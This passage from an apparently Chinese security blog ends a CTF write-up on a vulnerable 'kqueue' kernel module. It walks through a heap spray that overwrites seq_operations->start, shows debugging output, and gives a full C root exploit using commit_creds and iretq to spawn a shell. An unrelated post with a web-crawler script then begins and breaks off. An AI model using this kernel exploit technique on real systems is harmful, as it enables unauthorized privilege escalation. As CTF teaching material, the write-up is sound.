<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们 Read 一个 stat 文件时，内核会调用其 <code>proc_ops-&gt;proc_read</code> 指针（其默认值为 <code>seq_read</code> 函数）</li>
<li>进而调用 <code>seq_operations-&gt;start</code></li>
</ul>
<p>程序没有提供泄露内核基地址函数（<code>ldt_struct</code> 结构体使用 <code>kmalloc-16</code>，也无法使用），但程序没有开 <code>smap smep</code>，可以注入 shellcode 并在内核栈上找恰当的数据以获得内核基址</p>
<ul>
<li>PS：在 <code>rsp+0x8</code> 的位置可以泄露内核基地址</li>
</ul>
<p>于是我们可以堆喷覆写 <code>kmalloc-32</code> 上的 <code>seq_operations-&gt;start</code> 为 shellcode</p>
<p>这一步的调试比较麻烦，我的建议是：</p>
<ul>
<li>直接在 <code>shellcode</code> 打断点进行调试（<code>0x401D1F</code>）</li>
</ul>
<p>当然也可以用常规的调试方式：</p>
<ul>
<li>关闭 Kaslr ，开启 Root，在 <code>seq_read</code>（旧的内核版本用的是 <code>seq_read_iter</code>）打上断点，然后对着源码进行调试</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep seq_read</span></span><br><span class="line">ffffffff812010f0 T seq_read</span><br></pre></td></tr></table></figure>
<ul>
<li>另外还可以利用 IDA 去分析 vmlinux，以确定准确的断点（vmlinux 可以用 <code>extract-vmlinux</code> 来生成） </li>
<li>这部分可以对照源码来看</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF812010F0</span><br><span class="line">.text:FFFFFFFF812010F0                               loc_FFFFFFFF812010F0:                   ; CODE XREF: .text:FFFFFFFF8126FA8E↓j</span><br><span class="line">.text:FFFFFFFF812010F0 <span class="number">41</span> <span class="number">57</span>                         push    r15</span><br><span class="line">.text:FFFFFFFF812010F2 <span class="number">41</span> <span class="number">56</span>                         push    r14</span><br><span class="line">.text:FFFFFFFF812010F4 <span class="number">41</span> <span class="number">55</span>                         push    r13</span><br><span class="line">.text:FFFFFFFF812010F6 <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:FFFFFFFF812010F8 <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:FFFFFFFF812010F9 <span class="number">48</span> <span class="number">89</span> CD                      mov     rbp, rcx</span><br><span class="line">.text:FFFFFFFF812010FC <span class="number">53</span>                            push    rbx</span><br><span class="line">.text:FFFFFFFF812010FD <span class="number">48</span> <span class="number">83</span> EC <span class="number">20</span>                   sub     rsp, <span class="number">20</span>h</span><br><span class="line">.text:FFFFFFFF81201101 <span class="number">4</span>C <span class="number">8B</span> B7 C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     r14, [rdi+<span class="number">0</span>C8h]</span><br><span class="line">.text:FFFFFFFF81201108 <span class="number">48</span> <span class="number">89</span> <span class="number">74</span> <span class="number">24</span> <span class="number">08</span>                mov     [rsp+<span class="number">8</span>], rsi</span><br><span class="line">.text:FFFFFFFF8120110D <span class="number">4</span>D <span class="number">8</span>D <span class="number">7</span>E <span class="number">38</span>                   lea     r15, [r14+<span class="number">38</span>h]</span><br><span class="line">.text:FFFFFFFF81201111 <span class="number">48</span> <span class="number">89</span> <span class="number">14</span> <span class="number">24</span>                   mov     [rsp], rdx</span><br><span class="line">.text:FFFFFFFF81201115 <span class="number">4</span>C <span class="number">89</span> FF                      mov     rdi, r15</span><br><span class="line">.text:FFFFFFFF81201118 E8 <span class="number">83</span> <span class="number">97</span> <span class="number">8</span>E <span class="number">00</span>                call    sub_FFFFFFFF81AEA8A0</span><br></pre></td></tr></table></figure>
<p>下面简述一下定位的过程：</p>
<ul>
<li>先找函数指针，按 x 交叉引用看看哪个变量使用了函数指针：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 (__fastcall **v8)(__int64 *, __int64); <span class="comment">// rax</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后确定调用 <code>seq_operations-&gt;start</code> 的代码位置：（<code>0xFFFFFFFF8120115B</code>）</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v8</span> = (__int<span class="number">64</span> (__fastcall **)(__int<span class="number">64</span> *, __int<span class="number">64</span>))v<span class="number">5</span>[<span class="number">11</span>];</span><br><span class="line"><span class="attribute">v5</span>[<span class="number">2</span>] = <span class="number">0</span>LL;</span><br><span class="line"><span class="attribute">v9</span> = (*v<span class="number">8</span>)(v<span class="number">5</span>, (__int<span class="number">64</span>)(v<span class="number">5</span> + <span class="number">5</span>));</span><br></pre></td></tr></table></figure>
<p>调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0x401d1f</span>    push   rbp</span><br><span class="line">   <span class="number">0x401d20</span>    mov    rbp, rsp</span><br><span class="line">   <span class="number">0x401d23</span>    mov    r12, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line">   <span class="number">0x401d28</span>    sub    r12, <span class="number">0x201179</span></span><br><span class="line">   <span class="number">0x401d2f</span>    mov    r13, r12</span><br><span class="line">   <span class="number">0x401d32</span>    add    r12, <span class="number">0x8c580</span></span><br><span class="line">   <span class="number">0x401d39</span>    add    r13, <span class="number">0x8c140</span></span><br><span class="line">   <span class="number">0x401d40</span>    <span class="keyword">xor</span>    rdi, rdi</span><br><span class="line">   <span class="number">0x401d43</span>    call   r12</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x401d46</span>    mov    rdi, rax</span><br><span class="line">   <span class="number">0x401d49</span>    call   r13</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffffc900001bbe78</span> —▸ <span class="number">0xffffffff81201179</span> ◂— mov    r12, rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffffc900001bbe80</span> ◂— <span class="number">1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffffc900001bbe88</span> —▸ <span class="number">0x7ffc16cbd5b0</span> —▸ <span class="number">0x401d39</span> ◂— add    r13, <span class="number">0x8c140</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffffc900001bbe90</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffffc900001bbe98</span> ◂— add    byte ptr [rdx + <span class="number">0x17</span>], cl <span class="comment">/* 0x52b5f5b51e174a00 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0xffffc900001bbea0</span> ◂— <span class="number">1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0xffffc900001bbea8</span> ◂— <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>    max_entries;</span><br><span class="line">    <span class="keyword">uint16_t</span>    data_size;</span><br><span class="line">    <span class="keyword">uint16_t</span>    entry_idx;</span><br><span class="line">    <span class="keyword">uint16_t</span>    queue_idx;</span><br><span class="line">    <span class="keyword">char</span>*       data;</span><br><span class="line">&#125;<span class="keyword">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> dev_fd;</span><br><span class="line"><span class="keyword">size_t</span> getroot_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAVE_KQUEUE   0xB105BABE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_low = <span class="number">0x8c580</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_low = <span class="number">0x8c140</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_fd</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    dev_fd = open(str,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_reg</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong root&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> * msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createQueue</span><span class="params">(<span class="keyword">request_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, CREATE_KQUEUE, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">editQueue</span><span class="params">(<span class="keyword">request_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, EDIT_KQUEUE, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteQueue</span><span class="params">(<span class="keyword">request_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, DELETE_KQUEUE, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveQueue</span><span class="params">(<span class="keyword">request_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, SAVE_KQUEUE, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r12, [rsp + 0x8];&quot;</span></span><br><span class="line">        <span class="string">&quot;sub r12, 0x201179;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r12, prepare_kernel_cred_low;&quot;</span>  </span><br><span class="line">        <span class="string">&quot;add r13, commit_creds_low;&quot;</span>  </span><br><span class="line">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r13;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, getroot_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span>**envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>        seq_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">size_t</span>      *page;</span><br><span class="line">    <span class="keyword">size_t</span>      data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">request_t</span>   req;</span><br><span class="line"></span><br><span class="line">    save_reg();</span><br><span class="line">    getroot_addr = (<span class="keyword">size_t</span>)getroot;</span><br><span class="line">    init_fd(<span class="string">&quot;/dev/kqueue&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">        data[i] = (<span class="keyword">size_t</span>)shellcode;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode : 0x%lx\n&quot;</span>,shellcode);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    req.max_entries = <span class="number">0xffffffff</span>;</span><br><span class="line">    req.data_size = <span class="number">0x20</span> * <span class="number">8</span>;</span><br><span class="line">    createQueue(req);</span><br><span class="line"></span><br><span class="line">    req.data = data;</span><br><span class="line">    req.max_entries = <span class="number">0</span>;</span><br><span class="line">    req.data_size = <span class="number">0</span>;</span><br><span class="line">    editQueue(req);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    req.data_size = <span class="number">0x40</span>;</span><br><span class="line">    saveQueue(req);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        read(seq_fd[i], data, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个题其实是给了源码的，但我看到题目把结构体作为形参传入时，就知道 IDA 分析出来肯定很乱</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">create_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">delete_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>于是打算用这个题来练一练内核模块的逆向</p>
<p>这个题目有3个不同的结构体，当时把结构体的范围搞错了，导致程序的功能难以理解</p>
<p>最后还调试了一下 <code>seq_read</code> 的执行流程（真的很慢）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/05/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%BA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/05/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%BA%8C/" class="post-title-link" itemprop="url">知识图谱实践项目二</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-05 15:12:41 / Modified: 15:16:43" itemprop="dateCreated datePublished" datetime="2023-03-05T15:12:41+08:00">2023-03-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge-Graph/" itemprop="url" rel="index"><span itemprop="name">Knowledge Graph</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识图谱实践项目二"><a href="#知识图谱实践项目二" class="headerlink" title="知识图谱实践项目二"></a>知识图谱实践项目二</h2><p>第二代的知识图谱项目作出了如下升级：</p>
<ul>
<li>新添 <code>游戏作者 游戏类型</code> 主体</li>
<li>改变了爬虫的逻辑，使其可以爬取更多信息（效率有损失）</li>
<li>优化了知识图谱的关系</li>
</ul>
<p>爬虫代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin, urlencode</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>:</span></span><br><span class="line">    target_url = <span class="string">&#x27;https://down.ali213.net/pcgame/all/0-0-0-0-new-pic-&#x27;</span></span><br><span class="line">    base_url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name_file = <span class="number">0</span></span><br><span class="line">    time_file = <span class="number">0</span></span><br><span class="line">    size_file = <span class="number">0</span></span><br><span class="line">    language_file = <span class="number">0</span></span><br><span class="line">    content_file = <span class="number">0</span></span><br><span class="line">    url_file = <span class="number">0</span></span><br><span 